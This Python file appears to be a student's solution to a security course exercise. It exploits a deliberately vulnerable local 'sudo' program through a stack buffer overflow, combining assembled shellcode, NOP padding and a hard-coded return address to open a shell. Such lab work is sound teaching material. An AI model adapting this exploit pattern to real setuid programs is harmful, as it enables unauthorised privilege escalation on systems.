import os
import sys
from infosec.utils import assemble


def run_shell(path_to_sudo: str):
    """
    Exploit the vulnerable sudo program to open an interactive shell.

    The assembly code of the shellcode should be saved in `shellcode.asm`, use
    the `assemble` module to translate the assembly to bytes.

    WARNINGS:
    1. As before, use `path_to_sudo` and don't hard-code the path.
    2. If you reference any external file, it must be *relative* to the current
       directory! For example './shellcode.asm' is OK, but
       '/home/user/3/q2/shellcode.asm' is bad because it's an absolute path!

    Tips:
    1. For help with the `assemble` module, run the following command (in the
       command line).
           ipython3 -c 'from infosec.utils import assemble; help(assemble)'
    2. As before, prefer using `os.execl` over `os.system`.

    :param path_to_sudo: The path to the vulnerable sudo program.
    """
    # Your code goes here.
    X = 0xbfffdfb9
    Y = 0xbfffdffc - X
    sh_code     = assemble.assemble_file('./shellcode.asm')
    padding     = assemble.assemble_data("nop;"*(Y - len(sh_code)))
    ret_addr    = X.to_bytes(4, 'little')
    final_code  = sh_code + padding + ret_addr
    args = [path_to_sudo ,final_code, ""]
    os.execl(path_to_sudo, *args)


def main(argv):
    # WARNING: Avoid changing this function.
    if not len(argv) == 1:
        print('Usage: %s' % argv[0])
        sys.exit(1)

    run_shell(path_to_sudo='./sudo')


if __name__ == '__main__':
    main(sys.argv)
